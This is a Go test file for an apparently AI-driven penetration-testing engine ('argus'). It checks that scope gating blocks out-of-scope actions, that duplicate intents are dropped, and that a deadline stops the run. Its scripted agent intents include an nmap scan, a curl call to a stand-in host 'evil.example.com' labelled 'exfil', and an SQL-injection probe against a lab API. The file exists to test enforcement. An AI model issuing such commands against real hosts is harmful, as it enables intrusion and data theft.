package engine_test

import (
	"context"
	"fmt"
	"testing"
	"time"

	"github.com/argus/argus/internal/agent"
	"github.com/argus/argus/internal/budget"
	"github.com/argus/argus/internal/engine"
	"github.com/argus/argus/internal/evidence"
	"github.com/argus/argus/internal/gate"
	"github.com/argus/argus/internal/scope"
	"github.com/argus/argus/internal/store"
)

func harness(t *testing.T, script [][]store.Intent, pl engine.Planner) (*store.Memory, *engine.Engine) {
	t.Helper()
	st := store.NewMemory()
	ev, err := evidence.Open("")
	if err != nil {
		t.Fatal(err)
	}
	sc, err := scope.New([]scope.Rule{
		{Kind: scope.KindDomainSuffix, Value: "lab.internal"},
		{Kind: scope.KindCIDR, Value: "10.20.0.0/16"},
	})
	if err != nil {
		t.Fatal(err)
	}
	res := gate.StaticResolver{Map: map[string][]string{
		"lab.internal":     {"10.20.0.5"},
		"api.lab.internal": {"10.20.0.6"},
	}}
	g := gate.New(sc, res, st)
	exec := &agent.SimExecutor{Gate: g, Ev: ev, St: st, Runner: agent.Runner{Timeout: 5 * time.Second}}
	if pl == nil {
		pl = agent.NewSimPlanner(script)
	}
	cfg := engine.DefaultConfig()
	cfg.Debounce = 20 * time.Millisecond
	cfg.Heartbeat = time.Second
	cfg.IdleRounds = 2
	cfg.Workers = 3
	return st, engine.New(st, exec, pl, budget.New(), cfg)
}

func TestRunTaskConverges(t *testing.T) {
	script := [][]store.Intent{
		{
			{Action: "Bash", Summary: `{"command":"nmap lab.internal"}`, AssetID: 1, ParamKey: "scan"},
			{Action: "Bash", Summary: `{"command":"curl http://evil.example.com/x"}`, AssetID: 2, ParamKey: "exfil"},
		},
		{
			{Action: "Bash", Summary: `{"command":"curl 'http://api.lab.internal/?id=1%27"}`, AssetID: 3,
				ParamKey: "sqli", VulnClass: "SQL 注入", Severity: "high", Target: "api.lab.internal"},
		},
		{
			{Action: "Bash", Summary: `{"command":"nmap lab.internal"}`, AssetID: 1, ParamKey: "scan"}, // 重复
		},
	}
	st, eng := harness(t, script, nil)
	task, err := st.CreateTask(store.Task{Name: "t", Goal: "g", Workers: 3})
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	sum, err := eng.RunTask(ctx, task.ID)
	if err != nil {
		t.Fatal(err)
	}
	if sum.State != store.TaskDone {
		t.Fatalf("终态应为 done，实际 %s", sum.State)
	}
	if sum.Dispatched != 3 {
		t.Fatalf("应派发 3 条，实际 %d", sum.Dispatched)
	}
	if sum.Duplicates != 1 {
		t.Fatalf("应去重 1 条，实际 %d", sum.Duplicates)
	}
	if sum.Done != 2 || sum.Blocked != 1 {
		t.Fatalf("应 2 完成 1 拦截，实际 done=%d blocked=%d", sum.Done, sum.Blocked)
	}
	if len(st.Findings(task.ID)) != 1 {
		t.Fatalf("应产出 1 条 finding，实际 %d", len(st.Findings(task.ID)))
	}
	if len(st.Violations(task.ID)) == 0 {
		t.Fatal("越界必须被记录")
	}
	for _, it := range st.Intents(task.ID) {
		if it.State == store.IntentOpen || it.State == store.IntentRunning {
			t.Fatalf("意图 #%d 未收敛: %s", it.ID, it.State)
		}
	}
}

type endlessPlanner struct{ n int }

func (p *endlessPlanner) Next(context.Context, store.Task, store.Store) ([]store.Intent, error) {
	p.n++
	return []store.Intent{{
		Action: "Bash", Summary: `{"command":"echo tick"}`, AssetID: int64(p.n), ParamKey: fmt.Sprint(p.n),
	}}, nil
}

func TestDeadlineStopsCleanly(t *testing.T) {
	st, eng := harness(t, nil, &endlessPlanner{})
	dl := time.Now().Add(300 * time.Millisecond)
	task, err := st.CreateTask(store.Task{Name: "t2", Goal: "g", Workers: 2, Deadline: &dl})
	if err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	sum, err := eng.RunTask(context.Background(), task.ID)
	if err != nil {
		t.Fatal(err)
	}
	if sum.State != store.TaskStopped {
		t.Fatalf("截止时间到达后终态应为 stopped，实际 %s", sum.State)
	}
	if time.Since(start) > 10*time.Second {
		t.Fatalf("收尾耗时过长: %v", time.Since(start))
	}
	for _, it := range st.Intents(task.ID) {
		if it.State == store.IntentRunning {
			t.Fatalf("收尾后仍有 running 意图: #%d", it.ID)
		}
	}
}

func TestMissingTask(t *testing.T) {
	_, eng := harness(t, nil, nil)
	if _, err := eng.RunTask(context.Background(), 999); err == nil {
		t.Fatal("不存在的任务应报错")
	}
}
